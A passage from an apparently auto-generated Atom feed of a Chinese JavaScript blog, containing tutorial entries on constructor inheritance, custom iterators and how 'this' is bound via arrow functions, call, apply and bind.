href="#传递参数：" class="headerlink" title="传递参数："></a>传递参数：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.color=[<span class="string">&quot;red&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;green&quot;</span>]</span><br><span class="line">        arr.forEach(<span class="function"><span class="params">item</span>=&gt;</span><span class="built_in">this</span>.color.push(item));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//继承SuperType</span></span><br><span class="line">        SuperType.call(<span class="built_in">this</span>,[<span class="string">&#x27;black&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> intance1=<span class="keyword">new</span> SubType();</span><br><span class="line">    <span class="built_in">console</span>.log(intance1.color);<span class="comment">//[&#x27;red&#x27;, &#x27;blue&#x27;, &#x27;green&#x27;, &#x27;black&#x27;]</span></span><br><span class="line">    <span class="keyword">let</span> instance2=<span class="keyword">new</span> SubType();</span><br><span class="line">    <span class="built_in">console</span>.log(instance2.color);<span class="comment">//[&#x27;red&#x27;, &#x27;blue&#x27;, &#x27;green&#x27;, &#x27;black&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>也是使用构造函数模式自定义类型的问题：必须在狗仔函数中定义方法，因此函数不能重用，此外，子类也不能访问父类原型上定义的方法，因此所有类型只能使用构造函数模式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;构造函数&quot;&gt;&lt;a href=&quot;#构造函数&quot; class=&quot;headerlink&quot; title=&quot;构造函数&quot;&gt;&lt;/a&gt;构造函数&lt;/h1&gt;&lt;p&gt;构造函数也是函数，与普通函数唯一区别就是调用方式不同。任何函数只要使用new操作符调用就是构造函数，而不适用new操作符调用</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>遍历</title>
    <link href="https://coloey.github.io/2022/04/13/%E9%81%8D%E5%8E%86/"/>
    <id>https://coloey.github.io/2022/04/13/%E9%81%8D%E5%8E%86/</id>
    <published>2022-04-13T09:33:34.000Z</published>
    <updated>2022-04-13T09:56:49.229Z</updated>
    
    <content type="html"><![CDATA[<p>for…in 用来遍历对象的可枚举属性列表</p><p>forEach(…)用来遍历数组中的所有普值并忽略回调函数的返回值</p><p>for…of直接遍历值，会首先向被访问对象请求一个迭代器对象，然后通过调用迭代器对象的next()方法来遍历所有返回值</p><p>自定义对象迭代器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject=&#123;</span><br><span class="line">      <span class="attr">a</span>:<span class="number">2</span>,</span><br><span class="line">      <span class="attr">b</span>:<span class="number">3</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(myObject,<span class="built_in">Symbol</span>.iterator,&#123;</span><br><span class="line">      <span class="attr">enumerable</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="attr">writable</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="attr">configurable</span>:<span class="literal">true</span>,</span><br><span class="line">      <span class="attr">value</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">var</span> o=<span class="built_in">this</span>;</span><br><span class="line">          <span class="keyword">var</span> idx=<span class="number">0</span>;</span><br><span class="line">          <span class="keyword">var</span> ks=<span class="built_in">Object</span>.keys(o);<span class="comment">//获取Object对象所有键值</span></span><br><span class="line">          <span class="keyword">return</span>&#123;</span><br><span class="line">              <span class="attr">next</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//next是一个函数</span></span><br><span class="line">                  <span class="keyword">return</span>&#123;</span><br><span class="line">                      <span class="attr">value</span>:o[ks[idx++]],</span><br><span class="line">                      <span class="attr">done</span>:(idx&gt;ks.length)</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">var</span> it=myObject[<span class="built_in">Symbol</span>.iterator]();</span><br><span class="line">  it.next();</span><br><span class="line">  it.next();</span><br><span class="line">  it.next();</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> myObject)&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(v);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;for…in 用来遍历对象的可枚举属性列表&lt;/p&gt;
&lt;p&gt;forEach(…)用来遍历数组中的所有普值并忽略回调函数的返回值&lt;/p&gt;
&lt;p&gt;for…of直接遍历值，会首先向被访问对象请求一个迭代器对象，然后通过调用迭代器对象的next()方法来遍历所有返回值&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>Object</title>
    <link href="https://coloey.github.io/2022/04/13/Object/"/>
    <id>https://coloey.github.io/2022/04/13/Object/</id>
    <published>2022-04-13T09:25:11.000Z</published>
    <updated>2022-04-13T09:25:12.130Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>理解this</title>
    <link href="https://coloey.github.io/2022/04/13/%E7%90%86%E8%A7%A3this/"/>
    <id>https://coloey.github.io/2022/04/13/%E7%90%86%E8%A7%A3this/</id>
    <published>2022-04-13T07:56:41.000Z</published>
    <updated>2022-04-15T13:48:11.444Z</updated>
    
    <content type="html"><![CDATA[<h1 id="判断this指向："><a href="#判断this指向：" class="headerlink" title="判断this指向："></a>判断this指向：</h1><ol><li>由new调用？绑定到新创建的对象</li><li>由call或者apply（获得bind)调用?)绑定到指定对象</li><li>由上下文对象调用，绑定到那个上下文对象</li><li>默认：严格模式下绑定undefined否则绑定全局对象</li><li>箭头函数例外，会根据当前词法作用域来决定this,会绑定第一个在作用域链上找到的标识符。</li></ol><h1 id="this-的指向"><a href="#this-的指向" class="headerlink" title="this 的指向"></a>this 的指向</h1><p>在 ES5 中，其实 this 的指向，始终坚持一个原理：<strong>this 永远指向最后调用它的那个对象</strong>，来，跟着我朗读三遍：<strong>this 永远指向最后调用它的那个对象，this 永远指向最后调用它的那个对象，this 永远指向最后调用它的那个对象</strong>。记住这句话，this 你已经了解一半了。</p><p>下面我们来看一个最简单的例子：<br>例 1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line">function a() &#123;</span><br><span class="line">    var name = &quot;Cherry&quot;;</span><br><span class="line"></span><br><span class="line">    console.log(this.name);          // windowsName</span><br><span class="line"></span><br><span class="line">    console.log(&quot;inner:&quot; + this);    // inner: Window</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line">console.log(&quot;outer:&quot; + this)         // outer: Window复制代码</span><br></pre></td></tr></table></figure><p>这个相信大家都知道为什么 log 的是 windowsName，因为根据刚刚的那句话“<strong>this 永远指向最后调用它的那个对象</strong>”，我们看最后调用 <code>a</code> 的地方 <code>a();</code>，前面没有调用的对象那么就是全局对象 window，这就相当于是 <code>window.a()</code>；注意，这里我们没有使用严格模式，如果使用严格模式的话，全局对象就是 <code>undefined</code>，那么就会报错 <code>Uncaught TypeError: Cannot read property &#39;name&#39; of undefined</code>。</p><p>再看下这个例子：<br>例 2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line">var a = &#123;</span><br><span class="line">    name: &quot;Cherry&quot;,</span><br><span class="line">    fn : function () &#123;</span><br><span class="line">        console.log(this.name);      // Cherry</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">a.fn();复制代码</span><br></pre></td></tr></table></figure><p>在这个例子中，函数 fn 是对象 a 调用的，所以打印的值就是 a 中的 name 的值。是不是有一点清晰了呢~</p><p>我们做一个小小的改动：<br>例 3：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line">    var a = &#123;</span><br><span class="line">        name: &quot;Cherry&quot;,</span><br><span class="line">        fn : function () &#123;</span><br><span class="line">            console.log(this.name);      // Cherry</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    window.a.fn();复制代码</span><br></pre></td></tr></table></figure><p>这里打印 Cherry 的原因也是因为刚刚那句话“<strong>this 永远指向最后调用它的那个对象</strong>”，最后调用它的对象仍然是对象 a。</p><p>我们再来看一下这个例子：<br>例 4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line">var a = &#123;</span><br><span class="line">    // name: &quot;Cherry&quot;,</span><br><span class="line">    fn : function () &#123;</span><br><span class="line">        console.log(this.name);      // undefined</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">window.a.fn();复制代码</span><br></pre></td></tr></table></figure><p>这里为什么会打印 <code>undefined</code> 呢？这是因为正如刚刚所描述的那样，调用 fn 的是 a 对象，也就是说 fn 的内部的 this 是对象 a，而对象 a 中并没有对 name 进行定义，所以 log 的 <code>this.name</code> 的值是 <code>undefined</code>。</p><p>这个例子还是说明了：<strong>this 永远指向最后调用它的那个对象</strong>，因为最后调用 fn 的对象是 a，所以就算 a 中没有 name 这个属性，也不会继续向上一个对象寻找 <code>this.name</code>，而是直接输出 <code>undefined</code>。</p><p>再来看一个比较坑的例子：<br>例 5：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line">var a = &#123;</span><br><span class="line">    name : null,</span><br><span class="line">    // name: &quot;Cherry&quot;,</span><br><span class="line">    fn : function () &#123;</span><br><span class="line">        console.log(this.name);      // windowsName</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var f = a.fn;</span><br><span class="line">f();复制代码</span><br></pre></td></tr></table></figure><p>这里你可能会有疑问，为什么不是 <code>Cherry</code>，这是因为虽然将 a 对象的 fn 方法赋值给变量 f 了，但是没有调用，再接着跟我念这一句话：“<strong>this 永远指向最后调用它的那个对象</strong>”，由于刚刚的 f 并没有调用，所以 <code>fn()</code> 最后仍然是被 window 调用的。所以 this 指向的也就是 window。</p><p>由以上五个例子我们可以看出，this 的指向并不是在创建的时候就可以确定的，在 es5 中，永远是<strong>this 永远指向最后调用它的那个对象</strong>。</p><p>再来看一个例子：<br>例 6：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">function fn() &#123;</span><br><span class="line">    var name = &#x27;Cherry&#x27;;</span><br><span class="line">    innerFunction();</span><br><span class="line">    function innerFunction() &#123;</span><br><span class="line">        console.log(this.name);      // windowsName</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn()复制代码</span><br></pre></td></tr></table></figure><p>读到现在了应该能够理解这是为什么了吧(oﾟ▽ﾟ)o。</p><h1 id="怎么改变-this-的指向"><a href="#怎么改变-this-的指向" class="headerlink" title="怎么改变 this 的指向"></a>怎么改变 this 的指向</h1><p>改变 this 的指向我总结有以下几种方法：</p><ul><li>使用 ES6 的箭头函数</li><li>在函数内部使用 <code>_this = this</code></li><li>使用 <code>apply</code>、<code>call</code>、<code>bind</code></li><li>new 实例化一个对象</li></ul><p>例 7：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)     </span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout(  function () &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;,100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()     // this.func1 is not a function复制代码</span><br></pre></td></tr></table></figure><p>在不使用箭头函数的情况下，是会报错的，因为最后调用 <code>setTimeout</code> 的对象是 window，但是在 window 中并没有 func1 函数。</p><p>我们在改变 this 指向这一节将把这个例子作为 demo 进行改造。</p><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p>众所周知，ES6 的箭头函数是可以避免 ES5 中使用 this 的坑的。<strong>箭头函数的 this 始终指向函数定义时的 this，而非执行时。</strong>，箭头函数需要记着这句话：<strong>“箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则，this 为 undefined”</strong>。<strong>箭头函数的绑定无法被修改，new也不可以</strong></p><p>例 8 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)     </span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout( () =&gt; &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;,100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()     // Cherry复制代码</span><br></pre></td></tr></table></figure><h2 id="在函数内部使用-this-this"><a href="#在函数内部使用-this-this" class="headerlink" title="在函数内部使用 _this = this"></a>在函数内部使用 <code>_this = this</code></h2><p>如果不使用 ES6，那么这种方式应该是最简单的不会出错的方式了，我们是<strong>先将调用这个函数的对象保存在变量 <code>_this</code> 中</strong>，然后在函数中都使用这个 <code>_this</code>，这样 <code>_this</code> 就不会改变了。<br>例 9：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">var a = &#123;</span><br><span class="line"></span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)     </span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        var _this = this;</span><br><span class="line">        setTimeout( function() &#123;</span><br><span class="line">            _this.func1()</span><br><span class="line">        &#125;,100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()       // Cherry复制代码</span><br></pre></td></tr></table></figure><p>这个例子中，在 func2 中，首先设置 <code>var _this = this;</code>，这里的 <code>this</code> 是调用 <code>func2</code> 的对象 a，为了防止在 <code>func2</code> 中的 setTimeout 被 window 调用而导致的在 setTimeout 中的 this 为 window。我们将 <code>this(指向变量 a)</code> 赋值给一个变量 <code>_this</code>，这样，在 <code>func2</code> 中我们使用 <code>_this</code> 就是指向对象 a 了。</p><h2 id="使用-apply、call、bind"><a href="#使用-apply、call、bind" class="headerlink" title="使用 apply、call、bind"></a>使用 apply、call、bind</h2><p>使用 apply、call、bind 函数也是可以改变 this 的指向的，原理稍后再讲，我们先来看一下是怎么实现的：</p><h3 id="使用-apply"><a href="#使用-apply" class="headerlink" title="使用 apply"></a>使用 apply</h3><p>例 10：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout(  function () &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;.apply(a),100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()            // Cherry复制代码</span><br></pre></td></tr></table></figure><h3 id="使用-call"><a href="#使用-call" class="headerlink" title="使用 call"></a>使用 call</h3><p>例 11：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout(  function () &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;.call(a),100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()            // Cherry复制代码</span><br></pre></td></tr></table></figure><h3 id="使用-bind"><a href="#使用-bind" class="headerlink" title="使用 bind"></a>使用 bind</h3><p>例 12：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout(  function () &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;.bind(a)(),100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()            // Cherry复制代码</span><br></pre></td></tr></table></figure><h1 id="apply、call、bind-区别"><a href="#apply、call、bind-区别" class="headerlink" title="apply、call、bind 区别"></a>apply、call、bind 区别</h1><p>刚刚我们已经介绍了 apply、call、bind 都是可以改变 this 的指向的，但是这三个函数稍有不同。</p><p>在 <a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply">MDN</a> 中定义 apply 如下；</p><blockquote><p>apply() 方法调用一个函数, 其具有一个指定的this值，以及作为一个数组（或类似数组的对象）提供的参数</p></blockquote><p>语法：</p><blockquote><p>fun.apply(thisArg, [argsArray])</p></blockquote><ul><li>thisArg：在 fun 函数运行时指定的 this 值。需要注意的是，指定的 this 值并不一定是该函数执行时真正的 this 值，如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动指向全局对象（浏览器中就是window对象），同时值为原始值（数字，字符串，布尔值）的 this 会指向该原始值的自动包装对象。</li><li>argsArray：一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 fun 函数。如果该参数的值为null 或 undefined，则表示不需要传入任何参数。从ECMAScript 5 开始可以使用类数组对象。浏览器兼容性请参阅本文底部内容。</li></ul><h2 id="apply-和-call-的区别"><a href="#apply-和-call-的区别" class="headerlink" title="apply 和 call 的区别"></a>apply 和 call 的区别</h2><p>其实 apply 和 call 基本类似，他们的区别只是传入的参数不同。</p><p>call 的语法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fun.call(thisArg[, arg1[, arg2[, ...]]])复制代码</span><br></pre></td></tr></table></figure><p>所以 apply 和 call 的区别是 call 方法接受的是若干个参数列表，而 apply 接收的是一个包含多个参数的数组。</p><p>例 13：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a =&#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line">    fn : function (a,b) &#123;</span><br><span class="line">        console.log( a + b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var b = a.fn;</span><br><span class="line">b.apply(a,[1,2])     // 3复制代码</span><br></pre></td></tr></table></figure><p>例 14：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a =&#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line">    fn : function (a,b) &#123;</span><br><span class="line">        console.log( a + b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var b = a.fn;</span><br><span class="line">b.call(a,1,2)       // 3复制代码</span><br></pre></td></tr></table></figure><h2 id="bind-和-apply、call-区别"><a href="#bind-和-apply、call-区别" class="headerlink" title="bind 和 apply、call 区别"></a>bind 和 apply、call 区别</h2><p>我们先来将刚刚的例子使用 bind 试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a =&#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line">    fn : function (a,b) &#123;</span><br><span class="line">        console.log( a + b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var b = a.fn;</span><br><span class="line">b.bind(a,1,2)复制代码</span><br></pre></td></tr></table></figure><p>我们会发现并没有输出，这是为什么呢，我们来看一下 <a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind">MDN</a> 上的文档说明：</p><blockquote><p>bind()方法创建一个新的函数, 当被调用时，将其this关键字设置为提供的值，在调用新函数时，在任何提供之前提供一个给定的参数序列。</p></blockquote><p>所以我们可以看出，<strong>bind 是创建一个新的函数，我们必须要手动去调用</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a =&#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line">    fn : function (a,b) &#123;</span><br><span class="line">        console.log( a + b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var b = a.fn;</span><br><span class="line">b.bind(a,1,2)()           // 3复制代码</span><br></pre></td></tr></table></figure><p>==================================== 更新==============================</p><h1 id="JS-中的函数调用"><a href="#JS-中的函数调用" class="headerlink" title="JS 中的函数调用"></a>JS 中的函数调用</h1><p>看到留言说，很多童靴不理解为什么 例 6 的 innerFunction 和 例 7 的 this 是指向 window 的，所以我就来补充一下 JS 中的函数调用。<br>例 6：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">function fn() &#123;</span><br><span class="line">    var name = &#x27;Cherry&#x27;;</span><br><span class="line">    innerFunction();</span><br><span class="line">    function innerFunction() &#123;</span><br><span class="line">        console.log(this.name);      // windowsName</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn()复制代码</span><br></pre></td></tr></table></figure><p>例 7：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)     </span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout(  function () &#123;</span><br><span class="line">            